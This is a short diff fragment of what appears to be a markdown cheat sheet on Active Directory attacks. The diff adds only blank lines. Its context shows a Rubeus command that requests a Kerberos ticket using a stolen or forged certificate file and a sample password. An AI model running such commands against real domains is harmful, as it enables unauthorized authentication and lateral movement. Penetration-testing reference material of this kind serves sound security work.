@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:37:28.980808+00:00'
 ```bash
 .\Rubeus.exe asktgt /user:username /certificate:C:\Temp\cert.pfx /password:Passw0rd123!
 ```
+
+
